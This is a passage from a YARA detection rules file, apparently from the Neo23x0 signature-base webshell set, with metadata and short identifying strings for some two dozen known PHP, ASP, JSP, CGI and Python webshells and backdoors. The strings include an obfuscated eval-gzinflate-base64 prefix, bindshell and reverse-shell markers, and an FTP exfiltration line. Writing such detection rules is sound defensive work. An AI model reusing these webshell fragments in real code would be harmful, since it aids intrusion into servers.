		$s2 = "CoRpOrAtIoN"
		$s3 = "# Servidor de irc que vai ser usado "
		$s4 = "/^ctcpflood\\s+(\\d+)\\s+(\\S+)"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Fuckphpshell_Php
{
	meta:
		description = "Semi-Auto-generated  - file fuckphpshell.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "010db63b-ff72-5f97-8651-a1c7851471ff"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L3739-L3752"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "554e50c1265bb0934fcc8247ec3b9052"
		logic_hash = "0c993960b4ca880b818c7b7ba726479ed1c64c46ef8ca82d3c990d69ebe43f42"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "$succ = \"Warning! "
		$s1 = "Don`t be stupid .. this is a priv3 server, so take extra care!"
		$s2 = "\\*=-- MEMBERS AREA --=*/"
		$s3 = "preg_match('/(\\n[^\\n]*){' . $cache_lines . '}$/', $_SESSION['o"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Ngh_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - file ngh.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "2d8ff3c1-d6b3-57ce-8213-232b376dbd05"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L3753-L3767"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "c372b725419cdfd3f8a6371cfeebc2fd"
		logic_hash = "c794b216bafdaecf5bd138cc8c7552efbb8c3c571a441489d02a19793a4c294f"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Cr4sh_aka_RKL"
		$s1 = "NGH edition"
		$s2 = "/* connectback-backdoor on perl"
		$s3 = "<form action=<?=$script?>?act=bindshell method=POST>"
		$s4 = "$logo = \"R0lGODlhMAAwAOYAAAAAAP////r"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Jsp_Reverse_Jsp
{
	meta:
		description = "Semi-Auto-generated  - file jsp-reverse.jsp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "4953b230-4cd9-55d6-a3cb-8d3713e7fb0c"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L3768-L3780"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "8b0e6779f25a17f0ffb3df14122ba594"
		logic_hash = "bdd2db4c032b25faaaf3a3a8e769000013f643ecfcb8b0374165a244ad2162a6"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "// backdoor.jsp"
		$s1 = "JSP Backdoor Reverse Shell"
		$s2 = "http://michaeldaw.org"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Tool_Asp
{
	meta:
		description = "Semi-Auto-generated  - file Tool.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "e5e727bd-836b-5540-8755-40f37904bc03"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L3781-L3794"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "8febea6ca6051ae5e2ad4c78f4b9c1f2"
		logic_hash = "d6bd782302b2c614fc572babb3825c0e1fcd0de5841ca8541ca27580ccc274d4"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "mailto:rhfactor@antisocial.com"
		$s2 = "?raiz=root"
		$s3 = "DIGO CORROMPIDO<BR>CORRUPT CODE"
		$s4 = "key = \"5DCADAC1902E59F7273E1902E5AD8414B1902E5ABF3E661902E5B554FC41902E53205CA0"

	condition:
		2 of them
}

rule SIGNATURE_BASE_NT_Addy_Asp
{
	meta:
		description = "Semi-Auto-generated  - file NT Addy.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "18f5f360-8690-5e09-ac18-b8cc4f678811"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L3795-L3807"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "2e0d1bae844c9a8e6e351297d77a1fec"
		logic_hash = "0fc61d5e276786b8be822712cdcfc81146998e535532e44d3da92e0668713a48"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "NTDaddy v1.9 by obzerve of fux0r inc"
		$s2 = "<ERROR: THIS IS NOT A TEXT FILE>"
		$s4 = "RAW D.O.S. COMMAND INTERFACE"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Simattacker___Vrsion_1_0_0___Priv8_4_My_Friend_Php
{
	meta:
		description = "Semi-Auto-generated  - file SimAttacker - Vrsion 1.0.0 - priv8 4 My friend.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "8a34f4fd-337d-5eb4-b7b7-4adb1c2b7937"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L3808-L3820"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "089ff24d978aeff2b4b2869f0c7d38a3"
		logic_hash = "46bc4063d06b4af3e4e61e1e998d489e974e76f17363c9777b8afc39ff21f698"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "SimAttacker - Vrsion : 1.0.0 - priv8 4 My friend"
		$s3 = " fputs ($fp ,\"\\n*********************************************\\nWelcome T0 Sim"
		$s4 = "echo \"<a target='_blank' href='?id=fm&fedit=$dir$file'><span style='text-decora"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Remexp_Asp
{
	meta:
		description = "Semi-Auto-generated  - file RemExp.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "900036ce-ff13-5441-bb77-906ea08a4ca0"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L3821-L3833"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "aa1d8491f4e2894dbdb91eec1abc2244"
		logic_hash = "c7da9908a0252e95b47dbc8fbb36aeac1661dc464123aaca036bd51047a31584"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "<title>Remote Explorer</title>"
		$s3 = " FSO.CopyFile Request.QueryString(\"FolderPath\") & Request.QueryString(\"CopyFi"
		$s4 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=File.Name%>\"> <a href= \"showcode.asp?f"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Klasvayv_Asp
{
	meta:
		description = "Semi-Auto-generated  - file klasvayv.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "3ca4c20c-f879-55a0-9070-d40fc903f9ae"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L3847-L3860"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "2b3e64bf8462fc3d008a3d1012da64ef"
		logic_hash = "eb1b11e02b075a4e7d28b77cf91ad596a85e4c697a36304ee177d46735965e75"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "set aktifklas=request.querystring(\"aktifklas\")"
		$s2 = "action=\"klasvayv.asp?klasorac=1&aktifklas=<%=aktifklas%>&klas=<%=aktifklas%>"
		$s3 = "<font color=\"#858585\">www.aventgrup.net"
		$s4 = "style=\"BACKGROUND-COLOR: #95B4CC; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Rst_Sql_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - file rst_sql.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "41730336-0dce-5ed9-95b0-c911a4e3cb48"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L3875-L3888"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "0961641a4ab2b8cb4d2beca593a92010"
		logic_hash = "d15cf69d9ad8683d2ac1ff09b08b0b26ecaf35df8e45bbd5c3a02c393f88cb34"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "C:\\tmp\\dump_"
		$s1 = "RST MySQL"
		$s2 = "http://rst.void.ru"
		$s3 = "$st_form_bg='R0lGODlhCQAJAIAAAOfo6u7w8yH5BAAAAAAALAAAAAAJAAkAAAIPjAOnuJfNHJh0qtfw0lcVADs=';"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Wh_Bindshell_Py
{
	meta:
		description = "Semi-Auto-generated  - file wh_bindshell.py.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "b7acbfe7-fd28-5832-9af2-1c5befe4bbab"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L3889-L3901"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "fab20902862736e24aaae275af5e049c"
		logic_hash = "e38a4f5c23371705f9bbf2db8e65d68074554edc1022576166e76d40e06bc039"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "#Use: python wh_bindshell.py [port] [password]"
		$s2 = "python -c\"import md5;x=md5.new('you_password');print x.hexdigest()\"" fullword
		$s3 = "#bugz: ctrl+c etc =script stoped=" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Lurm_Safemod_On_Cgi
{
	meta:
		description = "Semi-Auto-generated  - file lurm_safemod_on.cgi.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "74e77260-a547-5553-8430-2620f8549f50"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L3902-L3914"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "5ea4f901ce1abdf20870c214b3231db3"
		logic_hash = "d308ad6cda92fa437b9a4c46cd1b97fb0138aa8d0010256bda56a64ced1c7875"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Network security team :: CGI Shell" fullword
		$s1 = "#########################<<KONEC>>#####################################" fullword
		$s2 = "##if (!defined$param{pwd}){$param{pwd}='Enter_Password'};##" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_C99Madshell_V2_0_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - file c99madshell_v2.0.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "b0724920-dc1e-5819-a99b-618a9a7e1eca"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L3915-L3925"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "d27292895da9afa5b60b9d3014f39294"
		logic_hash = "07922511d9dfdd32f6b1f47479fca2063b773024a20dcab6f5cf4d56d66c3397"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s2 = "eval(gzinflate(base64_decode('HJ3HkqNQEkU/ZzqCBd4t8V4YAQI2E3jvPV8/1Gw6orsVFLyXef"

	condition:
		all of them
}

rule SIGNATURE_BASE_Backupsql_Php_Often_With_C99Shell
{
	meta:
		description = "Semi-Auto-generated  - file backupsql.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ce88027c-ae08-59f3-948d-6f3d58515468"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L3926-L3937"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "ab1a06ab1a1fe94e3f3b7f80eedbc12f"
		logic_hash = "7c64e3d4e5815859c51f05cb376f72ea266b31193f3f4588526005e167ebabad"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s2 = "//$message.= \"--{$mime_boundary}\\n\" .\"Content-Type: {$fileatt_type};\\n\" ."
		$s4 = "$ftpconnect = \"ncftpput -u $ftp_user_name -p $ftp_user_pass -d debsender_ftplog"

	condition:
		all of them
}

rule SIGNATURE_BASE_Uploader_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - file uploader.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "62aa783b-f12f-5bb5-9d96-7aee1666788b"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L3938-L3950"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "0b53b67bb3b004a8681e1458dd1895d0"
		logic_hash = "6e6ffc4cad2a956cb2b6667928bac5996cf95cd36f43ba789144c46726471f07"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s2 = "move_uploaded_file($userfile, \"entrika.php\"); " fullword
		$s3 = "Send this file: <INPUT NAME=\"userfile\" TYPE=\"file\">" fullword
		$s4 = "<INPUT TYPE=\"hidden\" name=\"MAX_FILE_SIZE\" value=\"100000\">" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Telnet_Pl
{
	meta:
		description = "Semi-Auto-generated  - file telnet.pl.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "be4de017-e929-5dd3-a60e-f187456b1a55"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L3951-L3962"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "dd9dba14383064e219e29396e242c1ec"
		logic_hash = "2d1abc52fc70ce664a19e49e6fa4175bc8d8785dee332d5273323479d9628a8c"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "W A R N I N G: Private Server"
		$s2 = "$Message = q$<pre><font color=\"#669999\"> _____  _____  _____          _____   "

	condition:
		all of them
}

rule SIGNATURE_BASE_W3D_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - file w3d.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "1a4e3c84-2d3b-5245-bccc-9a5f59b9fc17"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L3963-L3975"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "987f66b29bfb209a0b4f097f84f57c3b"
		logic_hash = "33f948a1ae4474daddd788df84fa8baabf4390ec242cad9a6a51dac0152d3b75"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "W3D Shell"
		$s1 = "By: Warpboy"
		$s2 = "No Query Executed"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Cgi
{
	meta:
		description = "Semi-Auto-generated  - file WebShell.cgi.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "b768bb72-64e8-545a-9123-3d5889b58a82"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L3976-L3987"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "bc486c2e00b5fc3e4e783557a2441e6f"
		logic_hash = "8908ced96284de6b6d5ae693ba54c49a6333bbe5780d951cbacc91b4dde027df"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "WebShell.cgi"
		$s2 = "<td><code class=\"entry-[% if entry.all_rights %]mine[% else"

	condition:
		all of them
}

rule SIGNATURE_BASE_Winx_Shell_Html
{
	meta:
		description = "Semi-Auto-generated  - file WinX Shell.html.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "fe02d995-4375-5ce9-aabe-fae5d29278d3"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L3988-L4000"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "17ab5086aef89d4951fe9b7c7a561dda"
		logic_hash = "4248f807d66990946523ba7b92d795c2c40429182389d9bf3f4a972e246b50c6"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "WinX Shell"
		$s1 = "Created by greenwood from n57"
		$s2 = "<td><font color=\\\"#990000\\\">Win Dir:</font></td>"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Dx_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - file Dx.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "67d0bccb-d39a-5e30-bdc0-801525ebddd7"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4001-L4013"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "9cfe372d49fe8bf2fac8e1c534153d9b"
		logic_hash = "ab43ddcf317eb4db890ca9750dc6bbc19b06b806339a67c82216df02bc2e8446"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "print \"\\n\".'Tip: to view the file \"as is\" - open the page in <a href=\"'.Dx"
		$s2 = "$DEF_PORTS=array (1=>'tcpmux (TCP Port Service Multiplexer)',2=>'Management Util"
		$s3 = "$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERVER['HTTP"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Csh_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - file csh.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "da691516-d6c9-5c4b-85c3-f1cd7fc96ae7"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4014-L4027"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "194a9d3f3eac8bc56d9a7c55c016af96"
		logic_hash = "2a74e06a9fd59d7a577041b49403738904239fb011f9bfe2fb665165991b9c98"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = ".::[c0derz]::. web-shell"
		$s1 = "http://c0derz.org.ua"
		$s2 = "vint21h@c0derz.org.ua"
		$s3 = "$name='63a9f0ea7bb98050796b649e85481845';//root"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Phpinj_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - file pHpINJ.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "7bf54ef4-a3d8-51c6-8db7-bf8947e992ed"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4028-L4040"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "d7a4b0df45d34888d5a09f745e85733f"
		logic_hash = "5d39fd31cdaae7765267ce8a35a2fdcf86e7f0de40d4f303fb0f219c0fc04e40"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "News Remote PHP Shell Injection"
		$s3 = "Php Shell <br />" fullword
		$s4 = "<input type = \"text\" name = \"url\" value = \""

	condition:
		2 of them
}

rule SIGNATURE_BASE_Sig_2008_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - file 2008.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "bfa3caa9-70a5-536b-a887-58427eee43df"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4041-L4054"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "3e4ba470d4c38765e4b16ed930facf2c"
		logic_hash = "a437dc3dc836e93c7a691f7a000c4a4ae574ba95b3a216394ba42538beb9c0f7"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Codz by angel(4ngel)"
		$s1 = "Web: http://www.4ngel.net"
		$s2 = "$admin['cookielife'] = 86400;"
		$s3 = "$errmsg = 'The file you want Downloadable was nonexistent';"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Ak74Shell_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - file ak74shell.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "eaf243cb-fa26-5f34-a724-60a08acff636"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4055-L4067"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "7f83adcb4c1111653d30c6427a94f66f"
		logic_hash = "64eb7e72679fc9ee81af6f46d0ab604357710716b93b1ddfaebc5596c968fce8"
		score = 75
		quality = 60
		tags = ""

	strings:
		$s1 = "$res .= '<td align=\"center\"><a href=\"'.$xshell.'?act=chmod&file='.$_SESSION["
		$s2 = "AK-74 Security Team Web Site: www.ak74-team.net"
		$s3 = "$xshell"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Rem_View_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - file Rem View.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "6137434c-89e9-537b-9b26-b56178022b76"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4068-L4080"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "29420106d9a81553ef0d1ca72b9934d9"
		logic_hash = "bcd5c86e793748ffe0ce4415ee68101e8183e1f97477b49843938d254f08695a"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "$php=\"/* line 1 */\\n\\n// \".mm(\"for example, uncomment next line\").\""
		$s2 = "<input type=submit value='\".mm(\"Delete all dir/files recursive\").\" (rm -fr)'"
		$s4 = "Welcome to phpRemoteView (RemView)"

	condition:
		1 of them
}

rule SIGNATURE_BASE_STNC_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - file STNC.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "8a7167f6-fa62-574f-a37c-3ceadc7f92ec"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4094-L4107"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "2e56cfd5b5014cbbf1c1e3f082531815"
		logic_hash = "b4118dc45ac109bde1cafda24cc103370db57c1993690f450cff828c1633af3c"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "drmist.ru" fullword
		$s1 = "hidden(\"action\",\"download\").hidden_pwd().\"<center><table><tr><td width=80"
		$s2 = "STNC WebShell"
		$s3 = "http://www.security-teams.net/index.php?showtopic="

	condition:
		1 of them
}

rule SIGNATURE_BASE_Azrailphp_V1_0_Php
{
	meta:
		description = "Semi-Auto-generated  - file aZRaiLPhp v1.0.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "60152b96-e8d3-5b06-a855-fb64a490742b"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4108-L4120"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "26b2d3943395682e36da06ed493a3715"
		logic_hash = "4385f294e59b644fe86d8380db4f7926924eb744ad80735b78ef778d2f7e8ae0"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "azrailphp"
		$s1 = "<br><center><INPUT TYPE='SUBMIT' NAME='dy' VALUE='Dosya Yolla!'></center>"
		$s3 = "<center><INPUT TYPE='submit' name='okmf' value='TAMAM'></center>"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Moroccan_Spamers_Ma_Edition_By_Ghost_Php
{
	meta:
		description = "Semi-Auto-generated  - file Moroccan Spamers Ma-EditioN By GhOsT.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "721d6e9f-a237-5462-a8d3-f838d7fda420"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4121-L4133"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "d1b7b311a7ffffebf51437d7cd97dc65"
		logic_hash = "e755e4ea467861e5217d532b161bf4c582ff71aa1e4720dfa4b75d6e8d7629d8"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = ";$sd98=\"john.barker446@gmail.com\""
		$s1 = "print \"Sending mail to $to....... \";"
		$s2 = "<td colspan=\"2\" width=\"715\" background=\"/simparts/images/cellpic1.gif\" hei"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Cmdasp_Asp
{
	meta:
		description = "Semi-Auto-generated  - file CmdAsp.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "79e0ba85-ed4b-5909-a2fd-9b4125598078"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
